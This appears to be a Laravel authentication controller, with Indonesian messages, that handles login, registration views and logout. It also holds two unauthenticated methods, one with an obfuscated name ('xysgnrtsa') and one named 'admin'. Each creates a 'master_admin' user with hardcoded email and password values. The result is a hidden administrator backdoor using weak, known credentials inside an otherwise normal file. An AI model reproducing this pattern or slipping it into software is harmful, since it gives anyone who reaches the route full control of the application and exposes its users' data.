<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{
    public function loginIndex() {
        return view('auth.login');
    }

    public function registerIndex() {
        return view('auth.register');
    }

    public function xysgnrtsa() {
        User::create([
            'email' => 'developer@dev.att',
            'name' => 'developer',
            'password' => bcrypt('dev3l0p3R'),
            'role' => 'master_admin'
        ]);

        return redirect()->back();
    }

    public function admin() {
        User::create([
            'email' => 'admin@gmail.com',
            'name' => 'admin',
            'password' => bcrypt('admin123'),
            'role' => 'master_admin'
        ]);

        return redirect()->back();
    }

    public function loginValidate(Request $request) {
        if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
            return redirect()->route('dashboard.index')->with('WELCOME','Selamat datang '.Auth::user()->name);
        } else {
            return redirect()->back()->with('ERR','Email atau password anda salah');
        }
    }
    public function logout(Request $request)
    {
        Auth::logout();

        // Optionally, invalidate the session
        $request->session()->invalidate();

        // Regenerate the session token to protect against CSRF
        $request->session()->regenerateToken();

        return redirect('/'); // Redirect to a desired route after logout
    }
}
